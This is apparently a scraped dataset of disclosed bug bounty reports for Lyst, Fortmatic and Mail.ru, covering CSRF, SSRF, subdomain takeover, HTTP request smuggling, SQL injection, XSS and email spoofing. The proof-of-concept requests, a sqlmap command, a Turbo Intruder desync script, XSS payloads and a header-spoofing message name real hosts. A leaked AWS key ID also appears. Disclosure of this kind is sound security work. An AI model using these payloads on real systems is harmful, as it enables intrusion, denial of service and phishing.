3.jpg: tested in burp suite3 attachments:F223393: 1.jpgF223394: 2.jpgF223395: 3.jpg",https://hackerone.com/reports/271176,England,United Kingdom,London,2017,9,23,14,41
Lyst,101-250,0.0,50m-100m,$150.00,Medium,4.3,Cross-Site Request Forgery (CSRF),CSRF - Adding unlimited number of saved items via GET request,"inhibitor181  submitted a report to Lyst.Feb 13th (6 years ago)Hello, I have found a way of potentially adding thousands of items to the saved items list by using a GET request.
POC
Code 164 BytesWrap lines Copy Download1GET /email-capture/stock-alert/93543518/?return_url=/email-capture/stock-alert/91703404/?return_url=/email-capture/stock-alert/89201857/ HTTP/1.1
2Host: www.lyst.com
By adding a stock alert notification to an item, the respective item is automatically added in the saved list and because this is a GET request, there is no CSRF token/protection here.
IMPACT
Because this is done via GET request it is very easy to add thousands of products in the target user account by making one or both of these:

Chain your internal redirect requests (shown in POC)
Simply embed 1000x 1px image that with the target link (of course different product id per image)

Because of the extreme volume of the added items, the attacker can make the target's save list simply unusable (he must then delete 1000 entries and NO ONE will do that). I think a lot of people are taking advantage of the list, so a CSRF here can have a pretty big/annoying impact and you could loose clients.
Video POC attached.",https://hackerone.com/reports/205953,England,United Kingdom,London,2017,2,13,12,5
Lyst,101-250,0.0,50m-100m,$100.00,Low,2.0,Violation of Secure Design Principles,Mixed Active content issue on https://www.lyst.com,mrr3boot  submitted a report to Lyst.Feb 18th (6 years ago),https://hackerone.com/reports/207329,England,United Kingdom,London,2017,2,18,14,8
Lyst,101-250,0.0,50m-100m,$100.00,No value,0.0,Violation of Secure Design Principles,Site configured improperly at subdomain of lyst.co.uk,"mr_edwards  submitted a report to Lyst.Feb 23rd (6 years ago)Steps to reproduce the issue:
Go to : ""https://w.lyst.co.uk/""
It will give you message
Code 157 BytesWrap lines Copy Download1The owner of w.lyst.co.uk has configured their website improperly.
2To protect your information from being stolen, 
3Firefox has not connected to this website.
Image:
Image F163225: Screenshot_from_2017-02-24_01-29-06.png 90.75 KiBZoom in Zoom out Copy Download
A attacker will send this link to user, where he will be shown this message, will break her/his trust from lyst.
Tested in Firefox latest version.
Thanks1 attachment:F163225: Screenshot_from_2017-02-24_01-29-06.pngiserko Lyst staff  closed the report and changed the status to Informative. Feb 24th (6 years ago)@nsonaniya2010 thanks for the report, we are aware of this and have left it as is, due to lack of certificates. I would disagree, it would deteriorate trust in Lyst though.mr_edwards   posted a comment. Feb 24th (6 years ago)Hey,
the problem is that firefox gives us error message with To protect your information from being stolen this line.
Which when a user will read that my information is being stolen then why did she trust, as we can see that this domain w.lyst.co.uk seems to be legitimate to user, and as lyst is a shopping website and also need some confidential information of user like Name, Address, Phone numbers, AND main things and very confidential infos are Credit Card Number, Name on credit card , CVV, Expiry date and this things are all related to money so if a legitimate browser show this information then this will break trust of user from you.
I hope you understand.
Thanksiserko Lyst staff  posted a comment. Feb 24th (6 years ago)@nsonaniya2010 while that is all true ... w.lyst.co.uk will never serve any valid traffic apart from redirect you to https://www.lyst.co.uk/.mr_edwards   posted a comment. Feb 24th (6 years ago)Hey, can you check the screen shot i have attached?
Image F163225: Screenshot_from_2017-02-24_01-29-06.png 90.75 KiBZoom in Zoom out Copy Download
which shows you are not redirecting to any domain, and you will only being served that page in the attachment.
I hope you will consider this issue and fix it.
Thanksiserko Lyst staff  posted a comment. Feb 24th (6 years ago)Browsers will complain about the certificate being wrong yes, however if you ignore the error if will follow the redirect and put you on an https version of the site.
Code 1.03 KiBWrap lines Copy Download1% curl -k -I -L http://w.lyst.com/
2HTTP/1.1 301 Moved Permanently
3Content-Length: 178
4Content-Type: text/html
5Date: Fri, 24 Feb 2017 09:03:19 GMT
6Location: https://www.lyst.com/
7Server: nginx
8Connection: keep-alive
9
10HTTP/1.1 200 OK
11Date: Fri, 24 Feb 2017 09:03:19 GMT
12Content-Type: text/html; charset=utf-8
13Connection: keep-alive
14Set-Cookie: __cfduid=de93153d3649953165785276afc7d691a1487926999; expires=Sat, 24-Feb-18 09:03:19 GMT; path=/; domain=.lyst.com; HttpOnly
15Set-Cookie: country=GB; expires=Sat, 24-Feb-2018 09:03:19 GMT; Max-Age=31536000; Path=/
16Set-Cookie: analytics1=""2bd33096-295b-4304-a3d5-2ce33da0d7bb:0:0:1487926999:a5b19df8-6c9c-47bb-b6c1-04f302512319""; Domain=lyst.com; expires=Sat, 24-Feb-2018 09:03:19 GMT; Max-Age=31536000; Path=/
17Set-Cookie: domain_request=1; Path=/
18Vary: Accept-Encoding
19Vary: Cookie
20X-Frame-Options: DENY
21X-Page-View-Id: 74b5c82d-b91f-4d59-b2d8-46817c23b3cd
22Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
23X-Content-Type-Options: nosniff
24Server: cloudflare-nginx
25CF-RAY: 3361be62dc4535a8-LHRmr_edwards   posted a comment. Feb 24th (6 years ago)Hey,
any user will not use curl in terminal for browsing lyst.
Also, fixing the issue and giving me result does not make your bug bounty program successful.
If any researcher found an issue, you should respect, and give him reward if issue is legitimate.
And you can see in screenshot that sites gives me result.
Also, your first comment, we are aware of this and have left it as is, due to lack of certificates shows that after reporting you have fixed it.
ThanksLyst  rewarded mr_edwards with a $100 bounty. Feb 27th (6 years ago)@nsonaniya2010 Unfortunately this did happen. We needed to renew the certificate for that specific endpoint and in the process we also added other missing domains, which *.lyst.co.uk was one of. Apologies for that.iserko Lyst staff  reopened this report. Feb 27th (6 years ago)iserko Lyst staff  closed the report and changed the status to Resolved. Feb 27th (6 years ago)mr_edwards   requested to disclose this report. Feb 27th (6 years ago)Hey,
Thanks for the bounty. :)  This report has been disclosed. Mar 29th (6 years ago)",https://hackerone.com/reports/208480,England,United Kingdom,London,2017,2,23,20,3
Lyst,101-250,0.0,50m-100m,$100.00,Low,2.0,Server-Side Request Forgery (SSRF),SSRF at iris.lystit.com,"tripwire  submitted a report to Lyst.Feb 16th (6 years ago)Server Side Request Forgery
Host: iris.lystit.com
Route: /models
Summary
This vulnerability allows unauthenticated attacker to make arbitrary server-side HTTP GET requests, e.g. issue HTTP-requests to internal hosts and resources, limitedly scan ports, potentially bypass some restrictions for incoming requests, etc. 
PoC
Reaching same REST application via local IP 127.0.0.1 at port 8080:
Code 277 BytesWrap lines Copy Download1POST /models/default/classification/color HTTP/1.1
2Host: iris.lystit.com
3Accept: application/json
4Content-Length: 111
5Content-Type: application/json
6Connection: close
7
8{
9    ""images"": [""http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png""]
10}
Response:
Code 259 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Allow: POST, OPTIONS
3Content-Type: application/json
4Date: Thu, 16 Feb 2017 13:05:28 GMT
5Vary: Cookie
6X-Frame-Options: SAMEORIGIN
7Content-Length: 76
8Connection: Close
9
10{""data"":{""color"":{""probability"":""0.903368339285"",""id"":12,""value"":""orange""}}}
Requesting attacker-controlled host leaks IP and these headers:
Code 294 BytesWrap lines Copy Download1Request: GET / HTTP/1.0
2Connection: close
3Accept-Encoding: gzip, deflate
4Accept: */*
5User-Agent: python-requests/2.7.0 CPython/2.7.6 Linux/3.13.0-108-generic
6X-NewRelic-ID: VgQPVFBTGwIGXFdQDwAC
7X-NewRelic-Transaction: PxQEBwVQDQoEAldbVQMPXlBSFB8EBw8RVU4aUV5bBwcKUV9XCAMBWlwCVENKQQ8AUgdXUw9VFTs=
Possible Mitigation Measures
Add whitelist to allow use of only trusted domains.",https://hackerone.com/reports/206894,England,United Kingdom,London,2017,2,16,14,13
Lyst,101-250,0.0,50m-100m,"$1,000.00",High,7.3,Privilege Escalation,Subdomain takeover of storybook.lystit.com,"parzel  submitted a report to Lyst.Jan 21st (3 years ago)Summary:
The subdomain storybook.lystit.com had an CNAME record pointing to an unclaimed S3 bucket. This is a high severity security issue because an attacker can register the bucket on AWS and therefore can serve her own content on the subdomain. This allows for various attacks.
Description:
The dangling CNAME record of storybook.lystit.com is pointing to ███████ and the bucket which could not be found was: ""storybook.lystit.com"". I was able to register a S3 bucket with this name in AWS. After enabling static website hosting I was able to takeover the subdomain and serve arbitrary content. I am serving a POC to proof I am controlling the subdomain as well as a simple XSS POC.
POC
POC: view-source:http://storybook.lystit.com/
Stored XSS: http://storybook.lystit.com/asdjklkas1312das879123.html
Image F691531: Screenshot_from_2020-01-21_17-48-19.png 13.34 KiBZoom in Zoom out Copy Download
Image F691530: Screenshot_from_2020-01-21_17-48-41.png 33.23 KiBZoom in Zoom out Copy Download
Supporting Material/References:
https://www.hackerone.com/blog/Guide-Subdomain-Takeovers
Recommendations for fix
Remove the dangling CNAME record from storybook.lystit.com
Impact
The domain takeover allows various attacks. As the full domain is attacker controlled it can be used to serve XSS attacks, phishing campaigns and might be used to bypass the Same Origin Policy on other lystit.com domains and services.2 attachments:F691530: Screenshot_from_2020-01-21_17-48-41.pngF691531: Screenshot_from_2020-01-21_17-48-19.png",https://hackerone.com/reports/779442,England,United Kingdom,London,2020,1,21,16,51
Magic,11-50,0.0,10m-50m,$350.00,Medium,6.5,HTTP Request Smuggling,HTTP SMUGGLING EXPOSED HMAC/DOS ,"pwny_sec  submitted a report to Magic.Dec 8th (3 years ago)HTTP SMUGGLING EXPOSED HMAC / DOS
Using the transfer-encoding header and following it with a zero. The back end leaked the hmac the back end reflected back the hmac key encryption type, and a lot of details. Further testing had it reflect more headers. [http-smuggling-dashboard-fortmatic.png] we will notice i was able to cause the next valid request to error out returning valuable details. Next picture will show the response being reflected back this is important, i will be devoting time on exploiting this further. 
Proof of Concept
[space]Transfer-Encoding: chunked
Code 696 BytesWrap lines Copy Download1GET /login HTTP/1.1
2Host: dashboard.fortmatic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://dashboard.fortmatic.com/
8DNT: 1
9Connection: keep-alive
10Cookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22
11Upgrade-Insecure-Requests: 1
12If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT
13Cache-Control: max-age=0
14Content-Type: application/x-www-form-urlencoded
15Content-Length: 5
16 Transfer-Encoding: chunked
17
180
19
20
Response
Code 3.84 KiBWrap lines Copy Download1HTTP/1.1 403 Forbidden
2Content-Type: application/xml
3Transfer-Encoding: chunked
4Connection: close
5Date: Sun, 08 Dec 2019 11:00:51 GMT
6Server: AmazonS3
7Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
8Content-Security-Policy: default-src 'self';style-src 'self' 'unsafe-inline'; frame-src https://*.fortmatic.com/ https://fortmatic.github.io/ blob: https://x2.fortmatic.com; img-src 'self' https://*.fortmatic.com/ https://fortmatic.github.io/ https://anima-uploads.s3.amazonaws.com/ https://www.google-analytics.com/ https://stats.g.doubleclick.net/ https://*.githubusercontent.com https://www.google.com/ data:; connect-src 'self' https://*.fortmatic.com/ https://api.segment.io/ https://api.mixpanel.com/ https://api.amplitude.com/; script-src 'self'  https://cdn.segment.com/ https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js https://www.google-analytics.com/analytics.js https://cdn.amplitude.com/; base-uri 'self';
9X-Content-Type-Options: nosniff
10X-Frame-Options: SAMEORIGIN
11X-XSS-Protection: 1; mode=block
12Referrer-Policy: strict-origin-when-cross-origin
13X-Cache: Error from cloudfront
14Via: 1.1 e2deefdf2f2c76b24ee4785b69116006.cloudfront.net (CloudFront)
15X-Amz-Cf-Pop: ATL56-C3
16X-Amz-Cf-Id: znmHV1cu6phenKt25Mwr0WtHOgrpgrR4FvReDNGyaA2t__4ZCGRdmA==
17
18<?xml version=""1.0"" encoding=""UTF-8""?>
19<Error><Code>SignatureDoesNotMatch</Code><Message>The request signature we calculated does not match the signature you provided. Check your key and signing method.</Message><AWSAccessKeyId>AKIAIJKUV7PUHL53M2YQ</AWSAccessKeyId><StringToSign>AWS4-HMAC-SHA256
2020191208T110051Z
2120191208/us-west-2/s3/aws4_request
227f35f27b1337db0e03780f8a4e47f011a5ae6fa11d0d62f36a953cf9b2021fc1</StringToSign><SignatureProvided>a39151b144736e9967f33fcc5c4e6d5d6221975273efc1bda31661d92ade8658</SignatureProvided><StringToSignBytes>41 57 53 34 2d 48 4d 41 43 2d 53 48 41 32 35 36 0a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 32 30 31 39 31 32 30 38 2f 75 73 2d 77 65 73 74 2d 32 2f 73 33 2f 61 77 73 34 5f 72 65 71 75 65 73 74 0a 37 66 33 35 66 32 37 62 31 33 33 37 64 62 30 65 30 33 37 38 30 66 38 61 34 65 34 37 66 30 31 31 61 35 61 65 36 66 61 31 31 64 30 64 36 32 66 33 36 61 39 35 33 63 66 39 62 32 30 32 31 66 63 31</StringToSignBytes><CanonicalRequest>GET
23/index.html
24
25content-type:application/x-www-form-urlencoded Transfer-Encoding: chunked
26host:dashboard.fortmatic.com.s3.amazonaws.com
27x-amz-content-sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
28x-amz-date:20191208T110051Z
29
30content-type;host;x-amz-content-sha256;x-amz-date
31e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</CanonicalRequest><CanonicalRequestBytes>47 45 54 0a 2f 69 6e 64 65 78 2e 68 74 6d 6c 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64 20 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0a 68 6f 73 74 3a 64 61 73 68 62 6f 61 72 64 2e 66 6f 72 74 6d 61 74 69 63 2e 63 6f 6d 2e 73 33 2e 61 6d 61 7a 6f 6e 61 77 73 2e 63 6f 6d 0a 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35 0a 78 2d 61 6d 7a 2d 64 61 74 65 3a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3b 68 6f 73 74 3b 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3b 78 2d 61 6d 7a 2d 64 61 74 65 0a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35</CanonicalRequestBytes><RequestId>D6ACD16A4B4F1851</RequestId><HostId>R+VilJrBSB5s4ILN8GAc98W5eIh6vZguZp+RPJBg/1QimzpFTvwgbtC/BYiNNmx6m8USBuzLndo=</HostId></Error>
Now lets change it up and try to cause cache poisoning and move it to desync attack.  The headers don't change much but this will cause the next valid request to be served with the error page. Load the request into turbo intruder to make finding it easier. This will in affect server users with my error page causing DOS. Notice in http-smuggling-dashboard-fortmatic2.png that the 200 status code are reflected back when you load the page. this is because when the error page happens it reflects a valid response to me. 
Turbo:
Code 1.34 KiBWrap lines Copy Download1# if you edit this file, ensure you keep the line endings as CRLF or you'll have a bad time
2import re
3
4def queueRequests(target, wordlists):
5
6    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
7    engine = RequestEngine(endpoint=target.endpoint,
8                           concurrentConnections=5,
9                           requestsPerConnection=1,
10                           resumeSSL=False,
11                           timeout=10,
12                           pipeline=False,
13                           maxRetriesPerRequest=0,
14                           engine=Engine.THREADED,
15                           )
16    engine.start()
17
18    # This will prefix the victim's request. Edit it to achieve the desired effect.
19    prefix = '''GET / HTTP/1.1
20Host: x2.fortmatic.com
21Content-Type: application/x-www-form-urlencoded
22Content-Length: 15
23
24x=1'''
25
26    chunk_size = hex(len(prefix)).lstrip(""0x"")
27    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
28    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
29    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
30    engine.queue(attack)
31
32    for i in range(1400):
33        engine.queue(target.req)
34        time.sleep(0.05)
35
36
37def handleResponse(req, interesting):
38    table.add(req)
Request
Code 809 BytesWrap lines Copy Download1GET /login HTTP/1.1
2Host: dashboard.fortmatic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://dashboard.fortmatic.com/
8DNT: 1
9Connection: keep-alive
10Cookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22
11Upgrade-Insecure-Requests: 1
12If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT
13Cache-Control: max-age=0
14Content-Type: application/x-www-form-urlencoded
15Content-length: 4
16 Transfer-Encoding: chunked
17
1872
19GET / HTTP/1.1
20Host: x2.fortmatic.com
21Content-Type: application/x-www-form-urlencoded
22Content-Length: 15
23
24x=1
250
26
27
Impact:
The miss configuration with the back end cause it to reflect back the error page when the next valid request comes through. This will lead to a DOS serve this error page when visitor view the website. I will work on exploiting this more
Resources:
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
https://portswigger.net/web-security/request-smuggling
https://portswigger.net/research/practical-web-cache-poisoning
Impact
Impact:
The miss configuration with the back end cause it to reflect back the error page when the next valid request comes through. This will lead to a DOS serve this error page when visitor view the website. I will work on exploiting this more",https://hackerone.com/reports/753939,California,United States,San Francisco,2019,12,8,11,22
Mail.ru,1001-5000,0.0,200m-1b,"$2,200.00",Critical,9.5,SQL Injection, allods.mail.ru sql injection,linkks  submitted a report to Mail.ru.Nov 15th (3 years ago),https://hackerone.com/reports/738740,Moscow,Russia,Moscow,2019,11,15,23,58
Mail.ru,1001-5000,0.0,200m-1b,"$2,500.00",High,7.5,Improper Certificate Validation, Disk-o Cloud application (Windows) does not validate server certificate on a TLS connection,aapo  submitted a report to Mail.ru.Nov 5th (2 years ago),https://hackerone.com/reports/1026893,Moscow,Russia,Moscow,2020,11,5,14,54
Mail.ru,1001-5000,0.0,200m-1b,"$1,500.00",High,7.95,SQL Injection,3igames.mail.ru SQL Injection,"treeakio  submitted a report to Mail.ru.Feb 6th (3 years ago)Error based SQLi:
https://wrd-pay.3igames.mail.ru/?openid=21&appid=1&ts=12&payitem=2&token=1&billno=1&version=1&zoneid=1&providetype=1&amt=1&payamt_coins=1&pubacct_payamt_coins=1&sig=1%27,1,1,1,(select%20exp(~(select*from(select%20user())x))),1);--%20-
SQLMAP:
sqlmap -u ""https://wrd-pay.3igames.mail.ru/?openid=21&appid=1&ts=12&payitem=2&token=1&billno=1&version=1&zoneid=1&providetype=1&amt=1&payamt_coins=1&pubacct_payamt_coins=1&sig=1%27,1,1,1,*,1);--%20-"" --technique E --dbs
██████
[██████
[█████████
[████
[████████
[████
[████
[██████████
[██████████
Impact
компрометация базы игры Меч короля: Начало",https://hackerone.com/reports/790005,Moscow,Russia,Moscow,2020,2,6,16,46
Mail.ru,1001-5000,0.0,200m-1b,"$4,000.00",High,8.2,Improper Access Control - Generic,[ RCE ] Through stopping the redirect in /admin/* the attacker able to bypass Authentication And Upload Malicious File,elmahdi  submitted a report to Mail.ru.Aug 28th (3 years ago),https://hackerone.com/reports/683957,Moscow,Russia,Moscow,2019,8,28,18,21
Mail.ru,1001-5000,0.0,200m-1b,$250.00,Critical,9.5,Memory Corruption - Generic,[185.30.178.57:8080] - Vulnerable to Jetleak,xaleraf4ra  submitted a report to Mail.ru.Aug 3rd (about 1 year ago),https://hackerone.com/reports/1289029,Moscow,Russia,Moscow,2021,8,3,17,49
Mail.ru,1001-5000,0.0,200m-1b,"$8,000.00",Low,2.0,Business Logic Errors,[fleet.city-mobil.ru] Driver balance increasing,act1on3  submitted a report to Mail.ru.Dec 4th (3 years ago),https://hackerone.com/reports/751347,Moscow,Russia,Moscow,2019,12,4,11,56
Mail.ru,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Cross-site Scripting (XSS) - Reflected,[account.mail.ru] XSS на странице восстановления пароля,"s_p_q_r  submitted a report to Mail.ru.Jun 1st (4 years ago)При генерации формы восстановления пароля значение email подставляется туда как есть:
https://account.mail.ru/recovery/support?email=%3Csvg%20onload=alert(document.domain)%3E
Domain, site, application
https://account.mail.ru/recovery/support
Testing environment
Firefox 60.0
Chrome 66.0
Steps to reproduce
Открыть https://account.mail.ru/recovery/support?email=%3Csvg%20onload=alert(document.domain)%3E
Actual results
XSS
Expected results, security impact description and recommendations
Фильтровать теги
PoC, exploit code, screenshots, video, references, additional resources
Image F303978: rec_xss.png 80.05 KiBZoom in Zoom out Copy Download
Impact
XSS1 attachment:F303978: rec_xss.pngkpebetka   changed the status to Triaged. Jun 1st (4 years ago)Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.
Присланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.Mail.ru  rewarded s_p_q_r with a $500 bounty. Jun 6th (4 years ago)Привет, вознаграждение за найденную уязвимость начислено на твой аккаунт. На странице https://hackerone.com/settings/bounties можно выбрать желаемый метод выплаты. 
Спасибо и ждем от тебя новых багрепортов!
P.S. работа по устранению уязвимости пока продолжается.kpebetka   closed the report and changed the status to Resolved. Jun 13th (4 years ago)Привет, бага закрыта.
Пожалуйста, подтвердите, что проблема больше не воспроизводится. s_p_q_r   posted a comment. Jun 14th (4 years ago)Привет,
Да, исправлено.3apa3a   added weakness ""Cross-site Scripting (XSS) - Reflected"" and removed weakness ""Cross-site Scripting (XSS) - DOM"". Jul 16th (4 years ago)3apa3a   requested to disclose this report. Jul 16th (4 years ago)s_p_q_r   agreed to disclose this report. Jul 31st (4 years ago)  This report has been disclosed. Jul 31st (4 years ago)",https://hackerone.com/reports/360787,Moscow,Russia,Moscow,2018,6,1,13,14
Mail.ru,1001-5000,0.0,200m-1b,$150.00,No value,0.0,SQL Injection,[3k.mail.ru] SQL Injection,"konqi  submitted a report to Mail.ru.Feb 15th (7 years ago)Добрый день.  Функция поиска уязвимо к атаке SQL Injection. Вектор атаки - Union Based
PoC. 
http://3k.mail.ru/info/library/index.php?obj=cat&id=212&searchST='+and+0+union+select+1,2,concat_ws(0x3a,user(),version()),4,5,6,7-- a
Вывод на странице:  master3k@localhost:5.0.90-log",https://hackerone.com/reports/116508,Moscow,Russia,Moscow,2016,2,15,6,19
Mail.ru,1001-5000,0.0,200m-1b,$500.00,No value,0.0,Cross-site Scripting (XSS) - DOM,[account.mail.ru] XSS на странице удаления аккаунта через backUrl,"s_p_q_r  submitted a report to Mail.ru.May 31st (4 years ago)Недостаточная валидация параметра backUrl даёт возможность указать javascript-ссылку:
https://account.mail.ru/user/delete?backUrl=javascript:alert(document.domain)
Code 142 BytesWrap lines Copy Download1getBackUrl: function (url) {
2	return /^http/.test(url) ? url : (this.urlData.backUrl || this.config.get('backUrl') || 'https://e.mail.ru');
3},
Code 72 BytesWrap lines Copy Download1exit: function (url) {
2	window.location.href = this.getBackUrl(url);
3 },
Code 82 BytesWrap lines Copy Download1onExit: function (event, ui) {
2	this.unloadHandled = true;
3	this.router.exit();
4},
Domain, site, application
https://account.mail.ru/user/delete
Testing environment
Firefox 60.0
Chrome 66.0
Steps to reproduce

Заходим в аккаунт
Открываем https://account.mail.ru/user/delete?backUrl=javascript:alert(document.domain)
Нажимаем «Отменить»

Actual results
XSS
Expected results, security impact description and recommendations
Фильтровать javascript + проверять, что ссылка ведёт на домен mail.ru
PoC, exploit code, screenshots, video, references, additional resources
Image F303613: acc_del_xss.png 30.85 KiBZoom in Zoom out Copy Download
Impact
XSS1 attachment:F303613: acc_del_xss.png3apa3a   changed the status to Triaged. Updated May 31st (4 years ago)Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.
Присланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.3apa3a   changed the status to Triaged. May 31st (4 years ago)Mail.ru  rewarded s_p_q_r with a $500 bounty. Jun 6th (4 years ago)Привет, вознаграждение за найденную уязвимость начислено на твой аккаунт. На странице https://hackerone.com/settings/bounties можно выбрать желаемый метод выплаты. 
Спасибо и ждем от тебя новых багрепортов!
P.S. работа по устранению уязвимости пока продолжается.kpebetka   closed the report and changed the status to Resolved. Jun 15th (4 years ago)Привет, бага закрыта.
Пожалуйста, подтвердите, что проблема больше не воспроизводится. s_p_q_r   posted a comment. Jun 19th (4 years ago)Привет,
Да, добавлена проверка:
Code 123 BytesWrap lines Copy Download1var IsMailRu = /^https?:\/\/(?:[\w.]+\.)?mail\.ru(?:[\/?].*)?$/;
2
3if (backUrl && IsMailRu.test(backUrl)) {
4	return backUrl;3apa3a   requested to disclose this report. Jul 16th (4 years ago)s_p_q_r   posted a comment. Jul 24th (4 years ago)А не фул опять будет, да?kpebetka   posted a comment. Jul 24th (4 years ago)Поправил на лимитедs_p_q_r   posted a comment. Jul 30th (4 years ago)Ну я-то как раз фул хотел) Просто мне не видно отсюда, какой дисклоз ожидается)3apa3a   posted a comment. Jul 31st (4 years ago)Поправил на фулs_p_q_r   agreed to disclose this report. Jul 31st (4 years ago)  This report has been disclosed. Jul 31st (4 years ago)",https://hackerone.com/reports/360191,Moscow,Russia,Moscow,2018,5,31,13,22
Mail.ru,1001-5000,0.0,200m-1b,"$1,000.00",High,7.95,Cross-site Scripting (XSS) - DOM,[account.mail.ru] XSS-уязвимость в форме авторизации,"kriakiku  submitted a report to Mail.ru.Jun 3rd (2 years ago)kriakiku   posted a comment. Updated Jun 3rd (2 years ago)3apa3a   changed the status to Triaged. Jun 3rd (2 years ago)danila-mailru   closed the report and changed the status to Resolved. Jun 3rd (2 years ago)kriakiku   posted a comment. Jun 3rd (2 years ago)Mail.ru  rewarded kriakiku with a $1,000 bounty. Jun 4th (2 years ago)kriakiku   posted a comment. Jun 4th (2 years ago)kriakiku   requested to disclose this report. Jun 4th (2 years ago)kpebetka   posted a comment. Jun 4th (2 years ago)3apa3a   agreed to disclose this report. Jun 29th (2 years ago)  This report has been disclosed. Jun 29th (2 years ago)Summary by kriakikuДумаю, что данная XSS'шка является отличным примером того, что фильтрация HTML-символов во входных данных не всегда достаточная мера защиты.  
Если будем раскрывать уязвимость, то вот более удачная демонстрация, без моих куков:
https://cloud.mail.ru/public/3S69/3Cy33GBTL - {F854885}",https://hackerone.com/reports/889874,Moscow,Russia,Moscow,2020,6,3,9,5
Mail.ru,1001-5000,0.0,200m-1b,$150.00,Medium,5.0,Improper Authentication - Generic,An implementation flaw in Mail.ru can be exploited for DKIM signature spoofing and email spoofing,"jianjun  submitted a report to Mail.ru.Nov 8th (3 years ago)Domain, site, application
https://e.mail.ru
Quick note: this report is different from my previous report (Report #727233) , and is not policy configuration or enforcement issue as well.
TL;DR
This report disclosure an implementation bug, which chains multiple features in the Mail.ru server to bypass Mail.ru sender authentication and forge the target website's DKIM signature. 
Here is a demo video to impersonate admin@accounts.mail.ru on Mail.ru. Mail.ru shows the spoofing message passes both DKIM and DMARC authentication. 
Video link: https://drive.google.com/open?id=1X3-TpaLnMZTpJOB3FzWt4K4SB1T3NQc9
Problem explanation
The threat model of this attack is same-domain spoofing, which means the attacker who has an account on the target email services and tries to impersonate another user's address (e.g., administrator) of the same domain.  
The spoofing attack proceeds in two phases. First, the attacker uses their account to email themselves through the email provider server. In the email, the attacker can create deceptive content in the email body, Subject header and To header, but not the From header given the Mail.ru's strict validation. When the Mail.ru server sends the message, it attaches its DKIM signature to the message.
Second, the attacker adds an extra From header with another user’s address to the DKIM-signed message and resends it to a victim. When the victim’s email server receives the message, its DKIM component may verify the original From header, and the message passes both DKIM and DMARC verification, while the MUA may show the fake From header.
The problem in the second step is that the Mail.ru server has strict message validation on the incoming messages, and rejects messages with multiple From headers. So we need another trick to bypass the validation. Here is the message we crafted in the video: (Note that the message has two From headers. In the first one, there is whitespace between the From and colon.)
Code 109 BytesWrap lines Copy Download1From : Mail.ru Team <admin@accounts.mail.ru>
2From: <attacker@mail.ru>
3To: <victim@mail.ru>
4
5Dear customer ...
 Mail.ru verifies the second one, and generate ""pass"" results for both DKIM and DMARC authentication, but Mail.ru web interface displays it as admin@accounts.mail.ru.
Steps to reproduce
I skipped the phase one because I have generated a spoofing message with my Mail.ru account and embed it into my scripts. If you want to reproduce the phase one, please let me know.


Download the tool I used in the demo video:  https://github.com/chenjj/espoofer


Download the file ambiguous-replay-mailru.py into the main directory: https://drive.google.com/open?id=1LuoqhWfcW3bfo5dmgZfchJuoRdDXXVOB


Change the ""victim_address"" in ambiguous-replay-mailru.py to a Mail.ru recipient address.


Run the code: python3 ambiguous-replay-mailru.py


How to fix
There may be two options can be applied to prevent this attack:
1) Email server and client should be consistent in interpreting the spoofing message.
